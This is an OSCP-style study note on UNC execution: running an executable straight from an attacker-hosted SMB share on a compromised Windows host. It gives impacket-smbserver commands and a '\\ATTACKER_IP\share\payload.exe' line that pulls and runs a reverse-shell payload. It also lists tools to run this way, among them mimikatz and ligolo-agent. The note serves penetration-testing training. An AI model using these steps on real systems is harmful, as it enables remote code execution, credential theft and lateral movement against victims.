# **UNC Execution & SMB-Based File Execution (OSCP)**

**UNC execution** is a technique where a Windows machine executes a file **directly from a network share** (SMB), instead of downloading it first.

This is **not usually a first foothold technique**.

It is most useful **after you already have command execution** on a Windows host.

## **What UNC Means**

UNC = **Universal Naming Convention**


Format: `\\ATTACKER_IP\share\file.exe`
Example: `\\10.10.14.5\tools\rev.exe`

If this runs,

- Connects to your SMB share
    
- Pulls the executable
    
- Executes it **immediately**
    
- No file is saved locally

## **🛠️ Hosting an SMB Share (Attacker Side)**
```bash
impacket-smbserver share .
```
Or with SMB2 support:
```bash
impacket-smbserver share . -smb2support
```

From a shell, RDP session, or exploit execution context:
```cmd
\\ATTACKER_IP\share\payload.exe
```
If you get a callback → UNC execution works.

If nothing happens:

- Try another method (certutil / powershell)


## **When You’d Actually Use This (Realistic OSCP Scenarios)**

UNC execution is useful **after** you already have access, for example:

- You popped a **low-priv Windows user**
    
- You have **RDP or a shell**
    
- You can run cmd.exe or powershell.exe
    
- You want a **cleaner or stronger shell**
    
- You’re preparing for **priv esc or lateral movement**
    

  

## **Common Files You’d Transfer / Execute This Way**
### **Reverse Shells**
	- winrev.exe
### **Enumeration Tools**
	- winPEASx64.exe
    
	- Seatbelt.exe
    
	- SharpHound.exe
### **Credential Tools**
- mimikatz.exe
### **Pivot / Tunnel Tools**
- ligolo-agent.exe

## **Related Notes**

- [[File_Transfer]]
- [[Impacket]]
- [[winPEAS]]
- [[Mimikatz]]
- [[Netcat]]